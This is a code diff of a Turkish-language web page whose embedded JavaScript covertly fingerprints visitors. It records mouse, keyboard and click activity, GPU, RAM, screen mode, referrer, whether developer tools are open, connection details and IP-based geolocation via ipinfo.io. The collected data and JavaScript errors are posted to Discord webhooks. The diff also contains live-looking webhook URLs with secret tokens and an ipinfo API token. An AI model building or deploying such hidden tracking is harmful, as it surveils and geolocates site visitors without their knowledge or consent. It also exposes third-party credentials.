@@ -225,7 +225,7 @@
 </script>
 
 <script>
-const webhookUrl = "https://discord.com/api/webhooks/1375991372825231481/vkBgwrAedw9MteoeBsEcLmynWWNQssWqjV5h9wLWD0Lv8fDELXOkRjiQx0nt_5LI2t3D"; // <== Webhook URL'ni buraya da koy!
+const webhookUrl = "https://discord.com/api/webhooks/1376671417013239838/Aj2Elbm2VtEhfRhETrsFEu-vDXo6r1XlN3LZzVgfEF3dtc89qOD1jiBMEPEFQNucgpUt"; // <== Webhook URL'ni buraya da koy!
 
 async function sendDownloadInfoToDiscord() {
     try {
@@ -268,8 +268,6 @@ document.addEventListener("DOMContentLoaded", () => {
         });
     });
 });
-</script>
-
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -311,13 +309,21 @@ document.addEventListener("DOMContentLoaded", () => {
 
   <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1376671417013239838/Aj2Elbm2VtEhfRhETrsFEu-vDXo6r1XlN3LZzVgfEF3dtc89qOD1jiBMEPEFQNucgpUt"; // !!! GÜVENLİK İÇİN SADECE TESTTE KULLANIN
+    const webhookURL = "WEBHOOK_URLINIZI_BURAYA_YAPISTIRIN";
     const startTime = Date.now();
     let userActivity = { clicked: false, typed: false, movedMouse: false };
-    
+
     document.addEventListener("click", () => userActivity.clicked = true);
     document.addEventListener("keydown", () => userActivity.typed = true);
     document.addEventListener("mousemove", () => userActivity.movedMouse = true);
+
+    window.onerror = function (message, source, lineno, colno, error) {
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `🛑 JS Hatası: ${message} @${source}:${lineno}` })
+      });
+    };
 
     function getConnectionInfo() {
       const conn = navigator.connection || {};
@@ -331,6 +337,21 @@ document.addEventListener("DOMContentLoaded", () => {
         Notifications: "Notification" in window,
         ServiceWorker: "serviceWorker" in navigator
       };
+    }
+
+    function getGPU() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      } catch {
+        return "Tespit edilemedi";
+      }
+    }
+
+    function isDevToolsOpen() {
+      return window.outerWidth - window.innerWidth > 100;
     }
 
     function getPartOfDay() {
@@ -381,13 +402,18 @@ document.addEventListener("DOMContentLoaded", () => {
         Ağ: getConnectionInfo(),
         GeceGündüz: getPartOfDay(),
         Ziyaret: isFirstVisit(),
-        Etkileşim: `Fare: ${userActivity.movedMouse}, Klavye: ${userActivity.typed}, Tık: ${userActivity.clicked}`
+        Etkileşim: `Fare: ${userActivity.movedMouse}, Klavye: ${userActivity.typed}, Tık: ${userActivity.clicked}`,
+        EkranModu: screen.orientation?.type || "Bilinmiyor",
+        GPU: getGPU(),
+        DevTools: isDevToolsOpen() ? "Açık" : "Kapalı",
+        RAM: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+        Referrer: document.referrer || "Doğrudan Giriş"
       };
 
       const features = detectFeatures();
       for (let f in features) data[`Destek - ${f}`] = features[f] ? "✅" : "❌";
 
-      fetch("https://ipinfo.io/json?token=747be1adb1d30b") // token alınmalı: https://ipinfo.io
+      fetch("https://ipinfo.io/json?token=747be1adb1d30b")
         .then(res => res.json())
         .then(ipdata => {
           const [lat, lon] = ipdata.loc.split(",");
@@ -409,6 +435,7 @@ document.addEventListener("DOMContentLoaded", () => {
   </script>
 </body>
 </html>
+
 
 
 </body></html>
